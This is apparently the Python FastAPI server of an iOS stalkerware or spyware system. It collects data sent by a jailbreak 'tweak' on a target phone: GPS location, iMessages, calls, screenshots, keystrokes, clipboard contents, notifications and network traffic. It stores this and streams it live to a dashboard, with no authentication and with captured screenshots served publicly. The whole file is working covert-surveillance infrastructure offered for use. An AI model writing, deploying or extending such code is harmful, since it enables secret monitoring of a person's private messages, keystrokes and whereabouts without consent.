import os
import json
import time
import asyncio
import sqlite3
from pathlib import Path
from datetime import datetime
from contextlib import asynccontextmanager

from fastapi import FastAPI, WebSocket, WebSocketDisconnect, File, UploadFile, Form
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

from database import *
import database as db

PORT = int(os.environ.get("PORT", "8080"))

BASE_DIR = Path(__file__).parent
STATIC_DIR = BASE_DIR / "static"
CAPTURES_DIR = BASE_DIR / "captures"
CAPTURES_DIR.mkdir(exist_ok=True)

connected_clients = set()

@asynccontextmanager
async def lifespan(app: FastAPI):
    db.init_db()
    yield

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

app.mount("/static", StaticFiles(directory=str(STATIC_DIR)), name="static")
app.mount("/captures", StaticFiles(directory=str(CAPTURES_DIR)), name="captures")

async def broadcast(data: dict):
    global connected_clients
    dead = set()
    for ws in connected_clients:
        try:
            await ws.send_json(data)
        except:
            dead.add(ws)
    connected_clients = connected_clients - dead

@app.get("/")
async def root():
    return HTMLResponse((STATIC_DIR / "index.html").read_text())

# --- Dashboard data endpoints ---

@app.get("/api/summary")
async def summary():
    return get_today_summary()

@app.get("/api/locations")
async def locations(limit: int = 100):
    return get_recent("locations", limit)

@app.get("/api/messages")
async def messages(limit: int = 100):
    return get_recent("messages", limit)

@app.get("/api/calls")
async def calls(limit: int = 50):
    return get_recent("calls", limit)

@app.get("/api/app_usage")
async def app_usage(limit: int = 100):
    return get_recent("app_usage", limit)

@app.get("/api/screen_captures")
async def screen_captures(limit: int = 50):
    return get_recent("screen_captures", limit)

@app.get("/api/network_log")
async def network_log(limit: int = 100):
    return get_recent("network_log", limit)

@app.get("/api/keystrokes")
async def keystrokes(limit: int = 100):
    return get_recent("keystrokes", limit)

@app.get("/api/notifications")
async def notifications(limit: int = 100):
    return get_recent("notifications", limit)

@app.get("/api/clipboard")
async def clipboard(limit: int = 50):
    return get_recent("clipboard_log", limit)

@app.get("/api/device_status")
async def device_status(limit: int = 50):
    return get_recent("device_status", limit)

# --- Ingestion endpoints (called by tweak) ---

@app.post("/api/ingest/location")
async def ingest_location(latitude: float = Form(...), longitude: float = Form(...),
                           altitude: float = Form(0), speed: float = Form(0),
                           accuracy: float = Form(0)):
    db.insert_location(latitude, longitude, altitude, speed, accuracy)
    data = {"type": "location", "latitude": latitude, "longitude": longitude,
            "altitude": altitude, "speed": speed, "accuracy": accuracy,
            "timestamp": datetime.now().isoformat()}
    await broadcast(data)
    return {"ok": True}

@app.post("/api/ingest/message")
async def ingest_message(text: str = Form(""), sender: str = Form(""),
                          recipient: str = Form(""), is_from_me: int = Form(0),
                          service: str = Form("iMessage"), timestamp: str = Form(None)):
    db.insert_message(text, sender, recipient, is_from_me, service, timestamp)
    data = {"type": "message", "text": text, "sender": sender, "recipient": recipient,
            "is_from_me": is_from_me, "service": service, "timestamp": timestamp or datetime.now().isoformat()}
    await broadcast(data)
    return {"ok": True}

@app.post("/api/ingest/call")
async def ingest_call(caller_id: str = Form(""), duration: int = Form(0),
                       call_type: str = Form("missed")):
    db.insert_call(caller_id, duration, call_type)
    data = {"type": "call", "caller_id": caller_id, "duration": duration,
            "call_type": call_type, "timestamp": datetime.now().isoformat()}
    await broadcast(data)
    return {"ok": True}

@app.post("/api/ingest/screen_capture")
async def ingest_screen_capture(file: UploadFile = File(...)):
    ts = datetime.now()
    filename = f"capture_{ts.strftime('%Y%m%d_%H%M%S_%f')}.jpg"
    filepath = CAPTURES_DIR / filename
    content = await file.read()
    filepath.write_bytes(content)
    db.insert_screen_capture(f"captures/{filename}")
    data = {"type": "screen_capture", "image_path": f"captures/{filename}",
            "timestamp": ts.isoformat()}
    await broadcast(data)
    return {"ok": True}

@app.post("/api/ingest/app_usage")
async def ingest_app_usage(app_name: str = Form(...), bundle_id: str = Form(""),
                            duration: int = Form(0)):
    db.insert_app_usage(app_name, bundle_id, duration)
    data = {"type": "app_usage", "app_name": app_name, "bundle_id": bundle_id,
            "duration": duration, "timestamp": datetime.now().isoformat()}
    await broadcast(data)
    return {"ok": True}

@app.post("/api/ingest/network")
async def ingest_network(url: str = Form(""), method: str = Form("GET"),
                          host: str = Form(""), bytes_sent: int = Form(0),
                          bytes_received: int = Form(0)):
    db.insert_network_log(url, method, host, bytes_sent, bytes_received)
    data = {"type": "network", "url": url, "method": method, "host": host,
            "bytes_sent": bytes_sent, "bytes_received": bytes_received,
            "timestamp": datetime.now().isoformat()}
    await broadcast(data)
    return {"ok": True}

@app.post("/api/ingest/keystroke")
async def ingest_keystroke(text: str = Form(...), app_name: str = Form("")):
    db.insert_keystroke(text, app_name)
    data = {"type": "keystroke", "text": text, "app_name": app_name,
            "timestamp": datetime.now().isoformat()}
    await broadcast(data)
    return {"ok": True}

@app.post("/api/ingest/clipboard")
async def ingest_clipboard(text: str = Form(...), app_name: str = Form("")):
    db.insert_clipboard(text, app_name)
    data = {"type": "clipboard", "text": text, "app_name": app_name,
            "timestamp": datetime.now().isoformat()}
    await broadcast(data)
    return {"ok": True}

@app.post("/api/ingest/notification")
async def ingest_notification(app_name: str = Form(""), title: str = Form(""),
                               body: str = Form("")):
    db.insert_notification(app_name, title, body)
    data = {"type": "notification", "app_name": app_name, "title": title, "body": body,
            "timestamp": datetime.now().isoformat()}
    await broadcast(data)
    return {"ok": True}

@app.post("/api/ingest/device_status")
async def ingest_device_status(battery_level: float = Form(0), is_charging: int = Form(0),
                                wifi_ssid: str = Form(""), signal_strength: int = Form(0)):
    db.insert_device_status(battery_level, is_charging, wifi_ssid, signal_strength)
    data = {"type": "device_status", "battery_level": battery_level,
            "is_charging": is_charging, "wifi_ssid": wifi_ssid,
            "signal_strength": signal_strength, "timestamp": datetime.now().isoformat()}
    await broadcast(data)
    return {"ok": True}

# --- WebSocket for real-time ---

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    connected_clients.add(websocket)
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        pass
    finally:
        connected_clients.discard(websocket)

if __name__ == "__main__":
    reload_enabled = os.environ.get("DEV_MODE", "").lower() in ("1", "true", "yes")
    uvicorn.run("server:app", host="0.0.0.0", port=PORT, reload=reload_enabled)
